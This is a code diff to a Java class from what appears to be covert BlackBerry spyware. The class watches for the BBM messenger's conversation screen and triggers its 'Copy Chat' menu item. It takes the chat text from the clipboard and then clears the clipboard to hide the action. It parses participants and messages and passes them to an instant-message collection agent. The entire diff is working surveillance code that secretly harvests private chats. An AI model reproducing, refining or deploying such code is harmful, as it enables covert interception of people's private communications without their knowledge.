@@ -10,9 +10,9 @@ import blackberry.agent.ImAgent;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.injection.MenuWalker;
-import blackberry.utils.Utils;
+import blackberry.utils.Check;
 
-public class ConversationScreen implements Runnable {
+public class ConversationScreen {
     private static Debug debug = new Debug("ConvScreen", DebugLevel.VERBOSE);
 
     private UiApplication bbmApplication;
@@ -23,15 +23,6 @@ public class ConversationScreen implements Runnable {
         //this.conversationScreens=conversationScreens;
 
         debug.info("conversation Leech: " + conversationScreens);
-    }
-
-    public void run() {
-        for (;;) {
-            Utils.sleep(2000);
-            debug.trace("run");
-
-            getConversationScreen();
-        }
     }
 
     public synchronized void getConversationScreen() {
@@ -45,27 +36,40 @@ public class ConversationScreen implements Runnable {
 
             debug.info("leech active screen: " + screen);
 
-            if (screen.getClass().getName().indexOf("BBMConversationScreen") >= 0
+            if (screen.getClass().getName().indexOf("ConversationScreen") >= 0
                     && bbmApplication.isForeground()) {
+
+                String conversation = extractConversation(screen);
+
                 if (!conversationScreens.contains(screen)) {
                     debug.info("Added new conversation screen: " + screen);
                     conversationScreens.addElement(screen);
                     // exploreField(screen, 0, new String[0]);
                 }
 
-                String conversation = extractConversation(screen);
-                parseConversation(conversation);
+                Vector result = parseConversation(conversation);
 
-                debug.ledStart(Debug.COLOR_YELLOW);
-            }
-            if (screen.getClass().getName().indexOf("BBMUserInfoScreen") >= 0) {
+                if (result != null) {
+                    //#ifdef DBC
+                    Check.asserts(result.size() == 2, "wrong size result:  "
+                            + result.size());
+                    //#endif
 
-                if (Backlight.isEnabled()) {
+                    String partecipants = (String) result.elementAt(0);
+                    Vector lines = (Vector) result.elementAt(1);
 
-                    //FieldExplorer explorer = new FieldExplorer();
-                    //Vector textfields = explorer.explore(screen, true);
+                    ImAgent agent = ImAgent.getInstance();
+                    agent.add(partecipants, lines);
+
+                    debug.ledStart(Debug.COLOR_YELLOW);
                 }
             }
+            /*
+             * if (screen.getClass().getName().indexOf("UserInfoScreen") >= 0) {
+             * if (Backlight.isEnabled()) { //FieldExplorer explorer = new
+             * FieldExplorer(); //Vector textfields = explorer.explore(screen,
+             * true); } }
+             */
         } catch (Exception ex) {
             //#ifdef DEBUG
             debug.error("getConversationScreen: " + ex);
@@ -84,8 +88,13 @@ public class ConversationScreen implements Runnable {
         if (MenuWalker.walk("Copy Chat", screen, true)) {
             String clip = (String) Clipboard.getClipboard().get();
             Clipboard.getClipboard().put("");
-            debug.info("Clip: "
-                    + clip.substring(0, Math.min(100, clip.length())));
+
+            if (!conversationScreens.contains(screen)) {
+                debug.info("Clip: " + clip);
+            }
+
+            //debug.info("Clip: "
+            //        + clip.substring(0, Math.min(100, clip.length())));
             return clip;
         } else {
             debug.info("NO Conversation screen!");
@@ -93,7 +102,7 @@ public class ConversationScreen implements Runnable {
         }
     }
 
-    private void parseConversation(String conversation) {
+    public static Vector parseConversation(String conversation) {
         // Participants:
         // -------------
         // Torcione, Whiteberry
@@ -102,58 +111,73 @@ public class ConversationScreen implements Runnable {
         // ---------
         // Torcione: Scrivo anche a he
 
-        int pos = conversation.indexOf("-------------");
-        String partecipants;
-        //String partecipant1, partecipant2;
-        int posStart = conversation.indexOf("\n", pos) + 1;
-        int posSep = conversation.indexOf(", ", posStart);
-        int posEnd = conversation.indexOf("\n", posSep);
+        try {
+            int pos = conversation.indexOf("-------------");
+            String partecipants;
+            //String partecipant1, partecipant2;
+            int posStart = conversation.indexOf("\n", pos) + 1;
+            int posSep = conversation.indexOf(", ", posStart);
+            int posEnd = conversation.indexOf("\n", posSep);
 
-        partecipants = conversation.substring(posStart, posEnd);
+            partecipants = conversation.substring(posStart, posEnd);
 
-        //partecipant1 = conversation.substring(posStart, posSep);
-        //debug.trace("partecipant 1: " + partecipant1);
-        //partecipant2 = conversation.substring(posSep + 2, posEnd);
-        //debug.trace("partecipant 2: " + partecipant2);
+            Vector result = new Vector();
 
-        int posMessages = getLinePos(conversation, 6);
-        int numLine = 1;
+            //partecipant1 = conversation.substring(posStart, posSep);
+            //debug.trace("partecipant 1: " + partecipant1);
+            //partecipant2 = conversation.substring(posSep + 2, posEnd);
+            //debug.trace("partecipant 2: " + partecipant2);
 
-        ImAgent agent = ImAgent.getInstance();
+            int posMessages = getLinePos(conversation, 6);
+            int numLine = 1;
 
-        Vector lines = new Vector();
+            Vector lines = new Vector();
 
-        while (true) {
-            String currentLine = getNextLine(conversation, posMessages);
-            if (currentLine == null) {
-                break;
-            }
-            posMessages += currentLine.length() + 1;
+            while (true) {
+                String currentLine = getNextLine(conversation, posMessages);
+                if (currentLine == null) {
+                    break;
+                }
+                posMessages += currentLine.length() + 1;
 
-            posSep = currentLine.indexOf(":");
-            String user = currentLine.substring(0, posSep);
-            String message = currentLine.substring(posSep + 2);
+                posSep = currentLine.indexOf(":");
+                String user = currentLine.substring(0, posSep);
+                String message = currentLine.substring(posSep + 2);
 
-            if (numLine < 5) {
+                if (numLine < 5) {
+                    //#ifdef DEBUG
+                    debug.trace("line " + numLine + " user: " + user
+                            + " message: " + message);
+                    //#endif
+                }
+                numLine += 1;
+
+                Line line = new Line(user, message);
                 //#ifdef DEBUG
-                debug.trace("line " + numLine + " user: " + user + " message: "
-                        + message);
+                debug.trace("parseConversation adding line: " + line);
                 //#endif
+                lines.addElement(line);
             }
-            numLine += 1;
 
-            Line line = new Line(user, message);
-            //#ifdef DEBUG
-            debug.trace("parseConversation adding line: " + line);
+            //agent.add(partecipants, lines);
+            debug.info("num lines: " + numLine);
+            result.addElement(partecipants);
+            result.addElement(lines);
+
+            //#ifdef DBC
+            Check.ensures(result.size() == 2, "wrong size result");
             //#endif
-            lines.addElement(line);
+            return result;
+        } catch (Exception ex) {
+            //#ifdef DEBUG
+            debug.error("parseConversation: " + ex);
+            //#endif
+            return null;
         }
 
-        agent.add(partecipants, lines);
-        debug.info("num lines: " + numLine);
     }
 
-    private String getNextLine(String conversation, int posMessages) {
+    private static String getNextLine(String conversation, int posMessages) {
 
         int endLinePos = conversation.indexOf("\n", posMessages);
         if (endLinePos > 0) {
@@ -163,7 +187,7 @@ public class ConversationScreen implements Runnable {
         }
     }
 
-    private int getLinePos(String conversation, int numLine) {
+    private static int getLinePos(String conversation, int numLine) {
         int nextLine = 0;
         for (int i = 0; i < numLine; i++) {
             nextLine = conversation.indexOf("\n", nextLine) + 1;
